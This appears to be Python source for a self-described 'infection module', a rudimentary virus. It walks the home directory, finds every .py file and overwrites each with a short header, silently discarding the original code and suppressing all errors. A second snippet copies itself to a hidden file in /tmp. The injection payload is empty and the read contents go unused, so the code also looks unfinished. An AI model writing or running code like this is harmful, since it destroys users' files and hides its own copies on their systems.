# Infection module:
import os
from pathlib import Path

class FileFinder:
    def __init__(self):
        self.files_found = []
        try:
            self.search()
            self.inject()
        except:
            pass

    def search(self):
        for dirpath, dirs, files in os.walk(Path.home()):
            for f in files:
                path = os.path.abspath(os.path.join(dirpath, f))
                ext = path.split('.')[-1]
                if ext == "py":
                    self.files_found.append(path)

    def inject(self):
        for f in self.files_found:
            with open(f, "r") as fl:
                old_data = fl.read()
            new_data = "import os;from pathlib import Path\n"
            new_data += """ """
            with open(f, "w") as fl:
                fl.write(new_data)

if __name__ == "__main__":
    ff = FileFinder()
    del ff

# Mini work-like script:
import shutil, sys




if __name__ == "__main__":
    try:
        shutil.copy(__file__, '/tmp/.{0}'.format(sys.argv[0]))
    except Exception as error:
        print(error)
